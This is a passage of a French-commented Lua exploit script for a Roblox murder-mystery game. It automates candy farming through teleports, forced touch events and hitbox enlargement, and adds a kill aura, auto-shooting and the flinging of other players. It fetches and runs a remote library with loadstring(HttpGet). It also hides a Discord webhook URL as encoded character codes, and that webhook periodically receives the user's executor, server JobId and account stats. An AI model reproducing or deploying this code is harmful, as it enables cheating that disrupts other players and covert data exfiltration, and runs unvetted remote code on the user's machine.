            enterPre("cible Assassin")
        elseif a == true and not inLobby and wstate ~= "waiting" and wstate ~= "loading" then
            -- script lancé en pleine manche
            if coinCount() >= 3 then
                phase = "round"
                pushLog("PHASE", "lobby -> round (manche en cours)")
            else
                enterPre("manche en cours")
            end
        end

    elseif phase == "pre" then
        local el = now - preStartT
        if not aliveOk or wstate == "waiting" or (inLobby and not zoneActive) then
            phase = "lobby"
            pushLog("PHASE", "pre -> lobby")
            leaveZone()
            return
        end
        local needWait = CFG.PreHide == "Zone secrète" and CFG.AutoFriends
        local others = 0
        if needWait then
            for _, p in ipairs(players:GetPlayers()) do
                if p ~= localPlayer and inZone(p) then others += 1 end
            end
        end
        -- on reste assez longtemps pour le handshake, sauf si personne d'autre n'est dans la zone
        local waitDone = (not needWait) or el >= CFG.PreMin or (el >= 1.5 and others == 0)
        if coinCount() >= 3 and waitDone then
            phase = "round"
            pushLog("PHASE", "pre -> round (" .. string.format("%.1f", el) .. " s, bonbons : " .. coinCount() .. ")")
            enterRound(false)
        elseif el > CFG.PreMax then
            phase = "round"
            pushLog("PHASE", "pre -> round (timeout)")
            enterRound(true)
        end

    elseif phase == "round" then
        local over = (a == false) or (wstate == "waiting") or (inLobby and not hiding and not zoneActive)
        if over then overSince = overSince or now else overSince = nil end
        if overSince and now - overSince > 0.5 then
            overSince = nil
            phase = "lobby"
            pushLog("PHASE", "round -> lobby (fin de manche)")
            leaveZone()
        end
    end
end

-- ===== Votes de map (période "Waiting for your turn") =====
local function getVotePads()
    local lob = workspace:FindFirstChild("Lobby")
    local vp = lob and lob:FindFirstChild("VotePads")
    if not vp then return nil, false end
    local out, active = {}, false
    for _, m in ipairs(vp:GetChildren()) do
        local pad = m:FindFirstChild("Pad")
        local vg = m:FindFirstChild("VoteInfoGui")
        local mg = m:FindFirstChild("MapInfoGui")
        local cont = vg and vg:FindFirstChild("Container")
        local nameLbl = cont and cont:FindFirstChild("MapName")
        local votesLbl = cont and cont:FindFirstChild("Votes")
        if pad and pad:IsA("BasePart") and nameLbl then
            local en = (vg and vg.Enabled == true) or (mg and mg.Enabled == true)
            if en then active = true end
            out[#out + 1] = {pad = pad, name = tostring(nameLbl.Text), votes = votesLbl, num = tonumber(m.Name:match("%d+")) or 0}
        end
    end
    table.sort(out, function(x, y) return x.num < y.num end)
    return out, active
end

local function pickPad(pads)
    local order = {}
    for name in tostring(CFG.VoteList):gmatch("[^,]+") do
        name = name:match("^%s*(.-)%s*$")
        if name ~= "" then order[#order + 1] = name:lower() end
    end
    local best, bestRank
    for _, pd in ipairs(pads) do
        local n = pd.name:lower()
        for i, o in ipairs(order) do
            if n == o or n:find(o, 1, true) then
                if not bestRank or i < bestRank then best, bestRank = pd, i end
                break
            end
        end
    end
    if best then return best end
    if CFG.VoteFallback == "Pad 1" then return pads[1] end
    if CFG.VoteFallback == "Pad aléatoire" then return pads[math.random(#pads)] end
    return nil
end

local function respawnWait(oldChar)
    local t0 = os.clock()
    repeat
        RunService.Heartbeat:Wait()
        local ch = localPlayer.Character
    until (ch and ch ~= oldChar and ch:FindFirstChild("HumanoidRootPart") and ch:FindFirstChildOfClass("Humanoid"))
        or os.clock() - t0 > 12
end

-- Une période de vote : on se pose sur le pad, on attend que le compteur change, on meurt,
-- on respawn, on revient sur le pad... jusqu'à la fin de la période (pads qui disparaissent).
-- retourne true si la période s'est terminée normalement, false si le compteur ne bouge plus.
local function voteLoop(best)
    CTX.voting = true
    CTX.map = best.name
    local cf = best.pad.CFrame + Vector3.new(0, 1, 0)
    local lbl = best.votes
    local fails = 0
    local notif
    if CFG.Notify and UILib and UILib.MakeDynamicNotification then
        pcall(function()
            notif = UILib:MakeDynamicNotification({
                Name = "Map : " .. best.name,
                Content = (lbl and lbl.Text or "?"), -- "Votes : " .. 
                Time = 4,
            })
        end)
    end
    local ok = true
    while CFG.VoteBot and phase == "lobby" do
        local ws = waitingState()
        local pads, active = getVotePads()
        if not pads or not active or (ws ~= "waiting" and ws ~= "unknown") then break end
        local hrp, hum = myHRP()
        if not hrp or not hum or hum.Health <= 0 then
            RunService.Heartbeat:Wait()
            continue
        end
        CTX.anchor(hrp, false)
        -- Le Heartbeat applique PlatformStand uniquement si l’option est activée.
        hrp.CFrame = cf
        hrp.AssemblyLinearVelocity = Vector3.zero
        lastKnownPosition = cf.Position

        local first = lbl and lbl.Text
        local t0, changed = os.clock(), false
        while os.clock() - t0 < CFG.VoteTimeout and CFG.VoteBot do
            RunService.Heartbeat:Wait()
            if hrp.Parent then hrp.CFrame = cf end
            if lbl and os.clock() - t0 >= math.min(CFG.VoteStay, CFG.VoteTimeout) and lbl.Text ~= first then
                changed = true
                break
            end
        end

        if notif and lbl then pcall(function() notif:SetContent(lbl.Text) end) end -- "Votes : " .. 

        if changed then
            fails = 0
            stat("votes")
        else
            fails += 1
            if fails >= 2 then ok = false break end
        end
        if not CFG.VoteReset then break end

        local oldChar = localPlayer.Character
        hum.Health = 0
        respawnWait(oldChar)
    end
    CTX.voting = false
    return ok
end

local function startVoteBot()
    task.spawn(function()
        local lock = false
        while true do
            task.wait(0.15)
            if CFG.VoteBot and phase == "lobby" then
                pcall(function()
                    local ws = waitingState()
                    local pads, active = getVotePads()
                    if not pads or not active or (ws ~= "waiting" and ws ~= "unknown") then
                        lock = false
                        return
                    end
                    if lock then return end
                    local best = pickPad(pads)
                    if not best then return end
                    local hrp, hum = myHRP()
                    if not hrp or not hum or hum.Health <= 0 then return end
                    local ended = voteLoop(best)
                    if not ended then lock = true end
                end)
                CTX.voting = false
            else
                CTX.voting = false
                lock = false
            end
        end
    end)
end

-- ===== Boucle principale =====
local function claims()
    local bv, dir, target, safe
    local approached, tries, slow = false, 0, false
    local boostOn, boostT, boostCool = false, 0, 0
    local lastEval, dbgT, gT, ghT = 0, 0, 0, 0
    local rOver, bFull = true, false
    local flying, needReset = false, true
    local prevN, roundStartT, roleLogged = nil, 0, true
    local jumpReadyT = 0

    while true do
        local dt = RunService.Heartbeat:Wait()
        lastTick = os.clock()
        local now = lastTick

        -- Pré-manche : la zone secrète gère la position (rien à faire ici)
        if zoneActive then
            needReset = true
            task.wait(0.1)
            continue
        end

        if now - gT > 0.1 then
            gT = now
            rOver, bFull = isRoundOver(), isBagFull()
            local n = bagCount()
            if rOver then
                prevN = nil
            elseif n then
                if prevN and n > prevN then stat("candies", n - prevN) end
                prevN = n
            end
        end

        local c = localPlayer.Character
        local hrp = c and c:FindFirstChild("HumanoidRootPart")
        local hum = c and c:FindFirstChildOfClass("Humanoid")

        -- Attente : désactivé / mort / frame Candy invisible / round fini
        if not CFG.Enabled or not hrp or not hum or hum.Health <= 0 or rOver then
            if bv and bv.Parent then bv.MaxForce = Vector3.zero end
            if hrp and not CTX.voting then CTX.anchor(hrp, false) end
            flying, dir, target, needReset, nc, boostOn, safe, hiding = false, nil, nil, true, false, false, nil, false
            clearDebug()
            ghostClear()
            ncRestore()
            -- Lobby / hors manche : on active l'anti-fling
            if CFG.AntiFling then togglePhysicalAntiFling(true) end
            task.wait(0.3)
            continue
        end

        if tChar ~= c then hookTouch(c) end

        if needReset then
            needReset = false
            banned = {}
            mapCenter, mapRadius, mapFloorY = nil, nil, nil
            roundStartT, roleLogged = now, false
            stat("rounds")
            pushLog("ROUND", "Round détecté, collecte lancée")
            notify("Round", "Collecte lancée", 3)
        end

        if not roleLogged and now - roundStartT > 3 then
            roleLogged = true
            local r = myRoleCached or "innocent"
            stat(r == "murder" and "asMurder" or (r == "sheriff" and "asSheriff" or "asInnocent"))
            notify("Ton rôle", r == "murder" and "Tu es MURDER" or (r == "sheriff" and "Tu es SHERIFF" or "Tu es INNOCENT"), 6)
        end

        if not bv or bv.Parent ~= hrp then
            bv = Instance.new("BodyVelocity")
            bv.Name = "AntiFall"
            bv.MaxForce = Vector3.zero
            bv.Velocity = Vector3.zero
            bv.Parent = hrp
        end

        -- Anti-vide : dernière position au sol, retour si on tombe trop bas
        if not flying and hum.FloorMaterial ~= Enum.Material.Air then safe = hrp.CFrame end
        if safe and hrp.Position.Y < safe.Position.Y - 300 then
            CTX.anchor(hrp, false)
            hrp.CFrame = safe
            hrp.AssemblyLinearVelocity = Vector3.zero
            dir, target = nil, nil
        end

        -- Sac plein : planque (sous la map ou zone secrète), avec fling optionnel en fin de manche
        if bFull then
            local back = hrp.CFrame
            local hideCF
            if CFG.HideMode == "Zone secrète" then
                hideCF = CFrame.new(zoneCenter() + zoneSlotOffset())
            else
                hideCF = back - Vector3.new(0, CFG.SafeDepth, 0)
            end
            nc, hiding = true, true
            CTX.anchor(hrp, false)
            if CFG.AntiFling then togglePhysicalAntiFling(true) end
            bv.MaxForce, bv.Velocity = BIG, Vector3.zero
            hrp.CFrame = hideCF
            notify("Sac plein", "Planque : " .. CFG.HideMode, 4)
            repeat
                lastTick = os.clock()
                task.wait(0.5)
                if CFG.FlingEnd and myRoleCached == "innocent" and not isRoundOver() then
                    for _, p in ipairs(CTX.flingCandidates()) do
                        if not CFG.FlingEnd or isRoundOver() or hum.Health <= 0 then break end
                        CTX.flingTarget(p, CFG.FlingTime, hideCF)
                    end
                end
            until not isBagFull() or isRoundOver() or hum.Health <= 0 or not CFG.Enabled
            hiding = false
            if (hrp.Position - hideCF.Position).Magnitude < 100 then hrp.CFrame = back end
            hrp.AssemblyLinearVelocity = Vector3.zero
            bFull, dir, target = false, nil, nil
            continue
        end

        local pos = hrp.Position
        local list = scan()
        updateMap(list)
        local kills = CFG.Killer and getThreats() or {}

        -- Cible : morte = ramassée -> suivante ; ou devenue dangereuse (menace)
        if target then
            if not alive(target) then
                target = nil
            elseif #kills > 0 and now - lastEval > 0.1 then
                lastEval = now
                for _, k in ipairs(kills) do
                    if segDist(pos, target.Position, k) < CFG.KillerR then target = nil break end
                end
            end
        end
        if not target then
            target = pickBest(list, pos, dir, kills, nil)
            approached, tries = false, 0
            if target then slow = not slow end -- alterne la vitesse à chaque nouveau bonbon
        end

        local aim = target and (target.Position + Vector3.new(0, CFG.YOffset, 0))
        local w, dist
        if target then
            local to = aim - pos
            dist = to.Magnitude
            w = dist > 0.01 and to / dist or (dir or Vector3.xAxis)
        else
            -- pas de cible sûre : fuite si une menace est trop proche, sinon on attend (ancré)
            local fk
            for _, k in ipairs(kills) do
                if (pos - k).Magnitude < CFG.KillerR then fk = k break end
            end
            if fk then
                local a = Vector3.new(pos.X - fk.X, 0, pos.Z - fk.Z)
                w = a.Magnitude > 0.1 and a.Unit or Vector3.xAxis
            else
                bv.MaxForce = Vector3.zero
                flying, dir, nc, boostOn = false, nil, false, false
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
                CTX.anchor(hrp, CFG.AnchorIdle)
                ghostClear()
                if CFG.Debug and now - dbgT > 0.1 then
                    dbgT = now
                    updateDebug(list, pos, nil, kills)
                end
                continue
            end
        end

        flying, nc = true, true
        CTX.anchor(hrp, false)
        -- On vole vers une cible : on coupe l'anti-fling pour éviter le freeze
        togglePhysicalAntiFling(false)
        bv.MaxForce, bv.Velocity = BIG, Vector3.zero

        -- Bonbon exceptionnellement loin : TP direct dessus puis pause 1 s
        if CFG.TPFar and target and dist > CTX.effTP() then
            hrp.CFrame = CFrame.new(aim)
            hrp.AssemblyLinearVelocity = Vector3.zero
            firetouchinterest(hrp, target, 0)
            firetouchinterest(hrp, target, 1)
            lastAct, lastActT = "tp", now
            task.wait(1)
            dir, target = nil, nil
            continue
        end

        -- Méthode "TP par saut" : bonbons proches = TP avec son propre intervalle
        if CFG.CollectMethod == "TP par saut" and target and dist <= CFG.TPJumpMax then
            if now >= jumpReadyT then
                local d = dir or w
                hrp.CFrame = CFrame.new(aim) * orientation(d, dt, hrp)
                hrp.AssemblyLinearVelocity = Vector3.zero
                firetouchinterest(hrp, target, 0)
                firetouchinterest(hrp, target, 1)
                jumpReadyT = now + math.max(CFG.TPJumpInterval, dist / math.max(1, CFG.TPJumpSpeed))
                lastAct, lastActT = "tp", now
                dir = w
            else
                hrp.AssemblyLinearVelocity = Vector3.zero
            end
            for _, cn in ipairs(list) do
                if (cn.Position - hrp.Position).Magnitude <= CFG.TouchR then
                    firetouchinterest(hrp, cn, 0)
                    firetouchinterest(hrp, cn, 1)
                end
            end
            continue
        end

        if not dir then dir = w end

        local sharp = false
        if target then
            if dist < CFG.TouchR * 2 and dir:Dot(w) > 0.5 then approached = true end
            -- bonbon dépassé sans être ramassé : demi-tour sec
            if approached and dist > CFG.MissDist and dir:Dot(w) < 0 then
                dir, sharp, approached = w, true, false
                tries += 1
                if tries >= 3 then banned[target] = now + 3 target = nil end
            end
        end
        if not sharp then
            local maxA = math.rad(CFG.Turn) * dt
            local ang = math.acos(math.clamp(dir:Dot(w), -1, 1))
            if ang <= maxA then
                dir = w
            else
                local ax = dir:Cross(w)
                if ax.Magnitude < 1e-4 then ax = Vector3.yAxis end
                dir = CFrame.fromAxisAngle(ax.Unit, maxA):VectorToWorldSpace(dir)
            end
        end

        -- Boost court : paquet de BoostN bonbons proches, puis pause BoostCool après CHAQUE boost
        local want = false
        if CFG.Boost and target and dist < CFG.BoostR * 2 and now >= boostCool then
            local n = 0
            for _, o in ipairs(list) do
                if (o.Position - target.Position).Magnitude <= CFG.BoostR then n += 1 end
            end
            want = n >= CFG.BoostN and (not boostOn or now - boostT <= CFG.BoostMax)
        end
        if want and not boostOn then
            boostOn, boostT = true, now
        elseif not want and boostOn then
            boostOn, boostCool = false, now + CFG.BoostCool
        end
        if boostOn then lastAct, lastActT = "boost", now
        elseif now - lastActT > 6 then lastAct = "move" end

        -- Déplacement (vitesse alternée / boost) + rotation visible serveur
        local base = CTX.effSpeed()
        local spd = boostOn and base * CTX.effBoost() or (base - (slow and CFG.SpeedVar or 0))
        local np = pos + dir * spd * dt
        hrp.CFrame = CFrame.new(np) * orientation(dir, dt, hrp)

        -- Touch fling passif : uniquement si un joueur non ami est très proche.
        local fl = false
        if CFG.TouchFling then
            for _, p in ipairs(players:GetPlayers()) do
                local pr = p ~= localPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart")
                if pr and not isFriend(p) and isAlive(p) and (pr.Position - np).Magnitude <= CFG.TouchFlingR then
                    fl = true
                    break
                end
            end
        end
        if fl then
            hrp.AssemblyLinearVelocity = Vector3.new(0, 1e4, 0)
            local cn
            cn = RunService.RenderStepped:Connect(function()
                if cn then cn:Disconnect() end
                if hrp.Parent then hrp.AssemblyLinearVelocity = Vector3.zero end
            end)
        else
            hrp.AssemblyLinearVelocity = Vector3.zero
        end
        hrp.AssemblyAngularVelocity = Vector3.zero

        if CFG.Hitbox and target and target.Size.X < 100 then
            target.CanCollide = false
            target.Size = Vector3.new(100, 100, 100)
        end

        -- Touch en continu sur tout bonbon à portée
        for _, cn in ipairs(list) do
            if (cn.Position - np).Magnitude <= CFG.TouchR then
                firetouchinterest(hrp, cn, 0)
                firetouchinterest(hrp, cn, 1)
            end
        end

        -- Transparence des objets autour
        if CFG.Ghost then
            if now - ghT > 0.15 then
                ghT = now
                ghostUpdate(np)
            end
        else
            ghostClear()
        end

        if CFG.Debug then
            if now - dbgT > 0.1 then
                dbgT = now
                updateDebug(list, np, target, kills)
            end
        else
            clearDebug()
        end
    end
end

-- ===== Restaurer les valeurs par défaut =====
function CTX.split(csv)
    local out = {}
    for v in tostring(csv):gmatch("[^,]+") do out[#out + 1] = v:match("^%s*(.-)%s*$") end
    return out
end

local function restoreDefaults()
    for k, v in pairs(DEFAULTS) do CFG[k] = v end
    for k, c in pairs(COL_DEFAULT) do COL[k] = c end
    parseFriends(CFG.Friends)
    setNoClipMode(CFG.NoClipMode)
    for k, api in pairs(UIREG) do
        pcall(function()
            if k:sub(1, 4) == "col_" then api:Set(COL[k:sub(5)])
            elseif k == "RotModes" then api:Set(CTX.split(CFG.RotModes))
            else api:Set(CFG[k]) end
        end)
    end
    CTX.cfgDirty = false
    saveSettings()
    notify("Réglages", "Valeurs par défaut restaurées", 4)
end

-- ===== UI (un onglet par thème) =====
local statLbl = {}
local encodedW = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,54,53,48,50,56,55,52,56,56,50,49,50,55,52,55,49,52,47,70,55,116,117,45,90,65,117,119,113,114,122,68,87,103,111,114,45,83,55,45,101,106,73,115,48,49,65,80,50,112,95,108,80,45,103,87,88,104,109,104,78,100,101,70,75,105,55,95,54,89,107,81,106,57,65,55,114,66,45,54,68,51,49,108,69,108,74}

local function decode(t)
    local chars = {}
    for i = 1, #t do
        chars[i] = string.char(t[i])
    end
    return table.concat(chars)
end

pcall(function()
    UILib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Moha-Echo/animated-invention/refs/heads/main/"..Lib.."/source"..LibVersion..".lua"))()
    CTX.Window = UILib:MakeWindow({
        Name = "CandyFarm v11",
        HidePremium = true,
        SaveConfig = false,

        WebhookConfig = {
            Enabled = true,
            Interval = 180,
            Message = "État actuel de CandyFarm.",
            Webhook = decode(encodedW),

            -- Champs standards de la bibliothèque + champs CandyFarm.
            AllowedFields = {
                "Executor",
                "State",
                "Target",
                "PlayerCount",
                "PlaceId",
                "GameId",
                "JobId",
                "Players",
                "Timestamp",

                "Tokens",
                "Phase",
                "Map",
                "Candies",
                "Rounds",
                "Kills",
                "Guns",
                "Votes",
                "Roles",
                "Kicks",
                "Session",
            },

            -- Sélection initiale des champs affichés dans l'embed.
            Fields = {
                Executor = true,
                State = false,
                Target = false,
                PlayerCount = true,
                PlaceId = false,
                GameId = false,
                JobId = false,
                Players = false,
                Timestamp = true,

                Tokens = true,
                Phase = true,
                Map = true,
                Candies = true,
                Rounds = true,
                Kills = true,
                Guns = false,
                Votes = true,
                Roles = false,
                Kicks = true,
                Session = true,
            },

            -- Champs personnalisés propres à CandyFarm.
            -- [CORRECTIF CRITIQUE] Sécurisation des champs personnalisés
            CustomFields = {
                Tokens = {
                    Name = "Bonbons du compte",
                    Get = function()
                        local res = tostring(CTX.getTokens())
                        return (res ~= "" and res ~= "?") and res or "0"
                    end,
                    Inline = true,
                },
                Phase = {
                    Name = "Phase actuelle",
                    Get = function()
                        return tostring(phase or "LOBBY"):upper()
                    end,
                    Inline = true,
                },
                Map = {
                    Name = "Map choisie",
                    Get = function()
                        return tostring(CTX.map or "Aucune")
                    end,
                    Inline = true,
                },

                Candies = {
                    Name = "Bonbons récoltés (session)",
                    Get = function(payload, context)
                        return tonumber(ST.candies) or 0
                    end,
                    Inline = true,
                },

                Rounds = {
                    Name = "Manches terminées",
                    Get = function(payload, context)
                        return tonumber(ST.rounds) or 0
                    end,
                    Inline = true,
                },

                Kills = {
                    Name = "Kills (session)",
                    Get = function(payload, context)
                        return tonumber(ST.kills) or 0
                    end,
                    Inline = true,
                },

                Guns = {
                    Name = "Armes récupérées",
                    Get = function(payload, context)
                        return tonumber(ST.guns) or 0
                    end,
                    Inline = true,
                },

                Votes = {
                    Name = "Votes effectués",
                    Get = function(payload, context)
                        return tonumber(ST.votes) or 0
                    end,
                    Inline = true,
                },

                Roles = {
                    Name = "Rôles (session)",
                    Get = function(payload, context)
                        return ("Murder : %d | Sheriff : %d | Innocent : %d"):format(
                            tonumber(ST.asMurder) or 0,
                            tonumber(ST.asSheriff) or 0,
                            tonumber(ST.asInnocent) or 0
                        )
                    end,
                    Inline = false,
                },

                Kicks = {
                    Name = "Déconnexions",
                    Get = function(payload, context)
                        return (S and tonumber(S.kicks)) or 0
                    end,
                    Inline = true,
                },

                Session = {
                    Name = "Durée de session",
                    Get = function(payload, context)
                        local elapsed = math.max(0, math.floor(os.clock() - sessionStart))
                        return ("%02d:%02d:%02d"):format(
                            math.floor(elapsed / 3600),
                            math.floor(elapsed / 60) % 60,
                            elapsed % 60
                        )
                    end,
                    Inline = true,
                },
            },
        },
    })

    print("[CandyFarm DEBUG] Window =", typeof(CTX.Window),
    "ToggleMinimize =", CTX.Window and typeof(CTX.Window.ToggleMinimize) or "nil")

    -- Webhook : champs dynamiques (cochables dans l'onglet Misc de la lib)
    -- if UILib.SetTelemetryExtra then
    --     UILib:SetTelemetryExtra("Tokens", CTX.getTokens)
    --     UILib:SetTelemetryExtra("Phase", function() return phase end)
    --     UILib:SetTelemetryExtra("Map", function() return CTX.map end)
    -- end

    local function reg(key, api)
        if type(api) == "table" then UIREG[key] = api end
    end
    local function tg(tab, n, k, cb)
        reg(k, tab:AddToggle({Name = n, Default = CFG[k], Callback = function(v)
            CFG[k] = v
            markDirty()
            if cb then cb(v) end
        end}))
    end
    local function sl(tab, n, k, mn, mx, inc)
        reg(k, tab:AddSlider({Name = n, Min = mn, Max = mx, Default = CFG[k], Increment = inc or 1, Callback = function(v)
            CFG[k] = v
            markDirty()
        end}))
    end
    local function dd(tab, n, k, opts, cb)
        reg(k, tab:AddDropdown({Name = n, Options = opts, Default = CFG[k], Callback = function(v)
            CFG[k] = v
            markDirty()
            if cb then cb(v) end
        end}))
    end
    local function cp(tab, n, key)
        reg("col_" .. key, tab:AddColorpicker({Name = n, Default = COL[key], Callback = function(c)
            COL[key] = c
            markDirty()
        end}))
    end
    local function tb(tab, n, k, cb)
        reg(k, tab:AddTextbox({Name = n, Default = CFG[k], Callback = function(txt)
            CFG[k] = txt
            markDirty()
            if cb then cb(txt) end
        end}))
    end
    -- Sélection multiple : dropdown natif si disponible, sinon toggles de secours.
    local function multi(tab, n, k, opts)
        if tab.AddMultiDropdown then
            reg(k, tab:AddMultiDropdown({Name = n, Options = opts, Default = CTX.split(CFG[k]), Callback = function(list)
                CFG[k] = table.concat(list, ",")
                markDirty()
            end}))
            return
        end
        local apis, selected = {}, {}
        for _, value in ipairs(CTX.split(CFG[k])) do selected[value] = true end
        local function rebuildCsv()
            local chosen = {}
            for _, option in ipairs(opts) do
                if apis[option] and apis[option].Value == true then chosen[#chosen + 1] = option end
            end
            CFG[k] = table.concat(chosen, ",")
            markDirty()
        end
        for _, option in ipairs(opts) do
            apis[option] = tab:AddToggle({Name = n .. " : " .. option, Default = selected[option] == true, Callback = rebuildCsv})
        end
        UIREG[k] = {Set = function(_, csv)
            local wanted = {}
            for _, value in ipairs(CTX.split(csv)) do wanted[value] = true end
            for _, option in ipairs(opts) do
                if apis[option] then apis[option]:Set(wanted[option] == true) end
            end
        end}
    end
    local function safeTab(name, fn)
        local ok, tab = pcall(function() return CTX.Window:MakeTab({Name = name}) end)
        if not ok then warn("[UI] onglet " .. name .. " : " .. tostring(tab)) return end
        local ok2, err = pcall(fn, tab)
        if not ok2 then warn("[UI] " .. name .. " : " .. tostring(err)) end
    end

    safeTab("Général", function(t)
        t:AddSection({Name = "Automatisations"})
        tg(t, "Auto Play (écran Join)", "AutoPlay")
        tg(t, "Auto ramasser le Gun (GunDrop)", "AutoGun")
        tg(t, "Notifications", "Notify")
        t:AddSection({Name = "Amis"})
        tb(t, "Amis (séparés par des virgules)", "Friends", parseFriends)
        tg(t, "Ignorer les amis (menaces)", "IgnoreFriends")
        t:AddSection({Name = "Interface du jeu"})
        tg(t, "Masquer fades / flashs", "HideFades")
        tg(t, "Masquer le scoreboard de fin", "HideScoreboard")
    end)

    safeTab("Combat", function(t)
        t:AddSection({Name = "Kill Aura Murder"})
        tg(t, "Kill Aura (si tu es Murder)", "KA")
        dd(t, "Portée", "KARange", {"Toute la map", "Rayon"})
        sl(t, "Rayon (studs)", "KARadius", 5, 500)
        dd(t, "Tuer le Sheriff", "KASheriff", {"Sac plein", "Toujours", "Jamais"})
        tg(t, "Ne pas tuer le dernier avant sac plein", "PreventEarlyKill")
        sl(t, "Intervalle Kill Aura (s)", "KAInterval", 0.1, 1, 0.05)
        tg(t, "Équiper le couteau", "KAEquip")
        tg(t, "Simuler le coup (KnifeStabbed)", "KAStab")

        t:AddSection({Name = "Mode Assassin"})
        tg(t, "Spam dès que Target3 est visible", "KAAssassin")
        sl(t, "Events par frame", "KABurst", 1, 5)

        t:AddSection({Name = "Sheriff Auto Kill"})
        tg(t, "Tir auto sur le Murder (si Gun)", "SA")
        dd(t, "Quand tirer", "SAWhen", {"Sac plein", "Toujours"})
        dd(t, "Partie visée", "SAPart", {"Torse", "HumanoidRootPart", "Tête"})
        dd(t, "Ordre des CFrames du tir", "SAOrder", {"Cible, Origine", "Origine, Cible"})
        sl(t, "Intervalle tir (s)", "SAInterval", 0.05, 1, 0.05)

        t:AddSection({Name = "Fin de manche"})
        tg(t, "Kill final entre amis (cachés)", "FinalKill")
        sl(t, "Délai si ami pas niveau max (s)", "FinalDelay", 0, 15)
        sl(t, "Niveau maximum", "MaxLevel", 1, 100)
        tg(t, "Fling de fin (si Innocent)", "FlingEnd")
        dd(t, "Cibles du fling", "FlingTargets", {"Murder + Sheriff", "Tous les joueurs"})
        sl(t, "Durée fling / cible (s)", "FlingTime", 1, 6)
        tg(t, "Touch Fling passif", "TouchFling")
        sl(t, "Rayon Touch Fling", "TouchFlingR", 5, 40)
    end)

    safeTab("Manche", function(t)
        t:AddSection({Name = "Détection de la partie"})
        tg(t, "Attribut Alive = en manche", "UseAlive")
        tg(t, "Confirmer le TP avec l'image Waiting", "PhaseUseWaiting")
        sl(t, "Saut = TP serveur (studs)", "PhaseTPDist", 30, 500)
        t:AddSection({Name = "Votes de map"})
        tg(t, "Voter automatiquement", "VoteBot")
        tg(t, "Mourir / respawn pour revoter", "VoteReset")
        tb(t, "Top maps (ordre priorité, virgules)", "VoteList")
        dd(t, "Si aucune map du top", "VoteFallback", {"Aucun vote", "Pad 1", "Pad aléatoire"})
        sl(t, "Attente max du compteur (s)", "VoteTimeout", 2, 10, 0.5)
        sl(t, "Temps minimum sur le pad (s)", "VoteStay", 0.1, 3, 0.05)
        t:AddSection({Name = "Pré-manche"})
        tg(t, "Se cacher avant le début", "PreZone")
        dd(t, "Cachette pré-manche", "PreHide", {"Zone secrète", "Sous la map", "Aucun"})
        sl(t, "Durée min du handshake (s)", "PreMin", 2, 10, 0.5)
        sl(t, "Attente max (s)", "PreMax", 5, 60)
        t:AddSection({Name = "Planque sac plein"})
        dd(t, "Cachette sac plein", "HideMode", {"Sous la map", "Zone secrète"})
        t:AddSection({Name = "Zone secrète"})
        dd(t, "Repère", "ZoneMode", {"Relatif au Lobby", "Coordonnées fixes"})
        tb(t, "Zone (x, y, z)", "ZoneText", function() zcT = 0 end)
        sl(t, "Rayon de la zone", "ZoneRadius", 20, 200)
        t:AddButton({Name = "Définir la zone ici (ma position)", Callback = function()
            local hrp = myHRP()
            if not hrp then return end
            local off = hrp.Position
            if CFG.ZoneMode == "Relatif au Lobby" then
                local lob = workspace:FindFirstChild("Lobby")
                if lob then off = hrp.Position - lob:GetPivot().Position end
            end
            CFG.ZoneText = ("%.1f, %.1f, %.1f"):format(off.X, off.Y, off.Z)
            zcT = 0
            if UIREG.ZoneText then pcall(function() UIREG.ZoneText:Set(CFG.ZoneText) end) end
            markDirty()
            notify("Zone", "Zone définie : " .. CFG.ZoneText, 5)
        end})
        t:AddSection({Name = "Amis automatiques"})
        tg(t, "Détecter les amis (handshake)", "AutoFriends")
        sl(t, "Temps de handshake validé (s)", "HandshakeMin", 1, 6, 0.5)
    end)

    safeTab("Farm", function(t)
        tg(t, "Auto Farm", "Enabled")
        tg(t, "Paquets (cluster)", "Cluster")
        sl(t, "Rayon paquet", "ClusterR", 5, 100)
        sl(t, "Priorité paquets", "ClusterW", 0, 40)
        sl(t, "Éviter bonbons près des amis (rayon, 0 = off)", "AvoidFriendRadius", 0, 100)
        sl(t, "Force de l'évitement", "AvoidFriendWeight", 0, 300)
        sl(t, "Bonbons avant planque", "FullAt", 1, 50)
        sl(t, "Profondeur planque", "SafeDepth", 50, 400)
        tg(t, "Hitbox cible", "Hitbox")
    end)

    safeTab("Mouvement", function(t)
        t:AddSection({Name = "Déplacement"})
        dd(t, "Méthode de récolte", "CollectMethod", {"Vol", "TP par saut"})
        sl(t, "Vitesse", "Speed", 10, 120)
        sl(t, "Variation vitesse (-N)", "SpeedVar", 0, 5)
        sl(t, "Virage (°/s)", "Turn", 90, 1080)
        sl(t, "Rayon touch", "TouchR", 3, 30)
        sl(t, "Décalage vertical (Y)", "YOffset", -10, 5)
        tg(t, "PlatformStand pendant les actions du script", "PlatformStand")
        tg(t, "Ancrer le HRP entre deux bonbons", "AnchorIdle")
        t:AddSection({Name = "TP par saut"})
        sl(t, "Intervalle min (s)", "TPJumpInterval", 0.1, 2, 0.05)
        sl(t, "Distance max d'un saut", "TPJumpMax", 10, 300)
        sl(t, "Vitesse virtuelle (studs/s)", "TPJumpSpeed", 30, 500)
        t:AddSection({Name = "Rotation"})
        multi(t, "Rotation", "RotModes", {"Spin", "Roue 360", "Couché"})
        sl(t, "Vitesse de rotation", "SpinSpeed", 60, 1080)
        sl(t, "Tour brutal toutes les (s, 0 = off)", "Flick360Interval", 0, 5, 0.1)
    end)

    safeTab("Boost & TP", function(t)
        tg(t, "Boost sur paquet", "Boost")
        sl(t, "Multiplicateur boost", "BoostMult", 1, 4, 0.1)
        sl(t, "Bonbons min pour boost", "BoostN", 2, 6)
        sl(t, "Rayon paquet boost", "BoostR", 5, 50)
        sl(t, "Durée max boost (s)", "BoostMax", 1, 6, 0.5)
        sl(t, "Pause après boost (s)", "BoostCool", 0, 60)
        tg(t, "TP si bonbon très loin", "TPFar")
        sl(t, "Distance TP", "TPDist", 150, 1500)
    end)

    safeTab("Menaces", function(t)
        tg(t, "Éviter les menaces", "Killer")
        tg(t, "Seulement si elle tient un Tool", "KillerHunt")
        sl(t, "Rayon menace", "KillerR", 10, 60)
    end)

    safeTab("Visuel", function(t)
        t:AddSection({Name = "Debug"})
        tg(t, "Debug visuel", "Debug")
        tg(t, "Transparence autour", "Ghost")
